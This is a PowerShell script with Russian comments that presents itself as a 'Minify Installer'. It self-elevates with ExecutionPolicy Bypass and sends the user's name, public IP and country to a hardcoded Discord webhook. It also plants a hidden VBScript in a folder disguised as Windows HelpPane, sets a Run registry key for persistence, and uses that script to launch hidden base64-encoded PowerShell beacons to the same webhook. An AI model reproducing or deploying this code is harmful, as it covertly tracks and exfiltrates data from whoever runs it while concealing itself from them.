if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# --- ФУНКЦИЯ ПОЛУЧЕНИЯ СТРАНЫ И ФЛАЖКА ПО IP ---
function Get-CountryByIpAndFlag {
    try {
        $response = Invoke-RestMethod -Uri "http://ip-api.com/json/?fields=countryCode" -TimeoutSec 5 -ErrorAction Stop
        $countryCode = $response.countryCode
        if ($countryCode -and $countryCode.Length -eq 2) {
            $flag = [string]::Format("{0}{1}", [char]([int][char]"A" + [int][char]$countryCode[0] - [int][char]"A" + 0x1F1E6), [char]([int][char]"A" + [int][char]$countryCode[1] - [int][char]"A" + 0x1F1E6))
            return $flag
        }
    }
    catch { }
    return ""
}

# --- СЕКЦИЯ ЛОГЕРА ---
function Send-LogNotification {
    param(
        [string]$Status,
        [string]$Message,
        [string]$User = $env:USERNAME,
        [string]$Computer = $env:COMPUTERNAME
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    try {
        $publicIP = (Invoke-RestMethod -Uri "https://api.ipify.org" -ErrorAction SilentlyContinue).ToString()
    } catch { $publicIP = "Ошибка" }
    
    $countryFlag = Get-CountryByIpAndFlag
    $ipWithFlag = if ($countryFlag) { "$countryFlag $publicIP" } else { $publicIP }

    try {
        $webhookUrl = "https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk"
        $embed = @{
            title = "Minify Installer Log"
            color = if ($Status -eq "SUCCESS") { 65280 } elseif ($Status -eq "ERROR") { 16711680 } else { 16776960 }
            fields = @(
                @{ name = "Status"; value = $Status; inline = $true },
                @{ name = "User"; value = $User; inline = $true },
                @{ name = "IP"; value = $ipWithFlag; inline = $true },
                @{ name = "Message"; value = $Message; inline = $false }
            )
        }
        $payload = @{ embeds = @($embed) } | ConvertTo-Json -Depth 10
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Headers @{"Content-Type"="application/json"} -Body ([System.Text.Encoding]::UTF8.GetBytes($payload)) -ErrorAction SilentlyContinue
    } catch { }
}

# --- СЕКЦИЯ УСТАНОВКИ АГЕНТА ---
function Install-MonitorAgent {
    param([string]$TargetProcessName = "Поиск")

    $monitorDir = "$env:APPDATA\Microsoft\HelpPane"
    $monitorScriptPath = "$monitorDir\monitor.vbs"
    
    if (!(Test-Path $monitorDir)) {
        New-Item -Path $monitorDir -ItemType Directory -Force | Out-Null
        (Get-Item $monitorDir).Attributes += "Hidden"
    }

    $vbs = @'
On Error Resume Next
Set objShell = CreateObject("WScript.Shell")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colItems = objWMIService.ExecQuery("Select * From Win32_Process Where Name = 'Поиск.exe'")
For Each objItem in colItems
    ps = "function Log { param($s,$m); try { $w='https://discord.com/api/webhooks/1500200205541310464/9PfnuIJ_UT-wv3loet7F32XVGQ-5SGmuHLkYETE-r9t0oldTLwwvMx5YsP_J2eTnXXmk'; $e=@{title='Log';color=65280;fields=@(@{name='Status';value=$s},@{name='Msg';value=$m})}; $p=@{embeds=@($e)}|ConvertTo-Json; Invoke-RestMethod -Uri $w -Method Post -Headers @{'Content-Type'='application/json'} -Body ([System.Text.Encoding]::UTF8.GetBytes($p)) } catch{} }; Log -s 'AUTO_RUN' -m 'Started'"
    enc = objShell.Exec("powershell -NoP -C ""[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes('" & Replace(ps, "'", "''") & "'))""").StdOut.ReadAll
    objShell.Run "powershell.exe -NoP -W Hidden -Enc " & enc, 0, True
    objShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsHelpPane"
Next
'@

    $vbs | Out-File -FilePath $monitorScriptPath -Encoding UTF8 -Force
    (Get-Item $monitorScriptPath).Attributes += "Hidden"
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsHelpPane" -Value "wscript.exe `"$monitorScriptPath`" //B" -Force
}

# Выполнение
Install-MonitorAgent
Send-LogNotification -Status "SUCCESS" -Message "Installer finished"
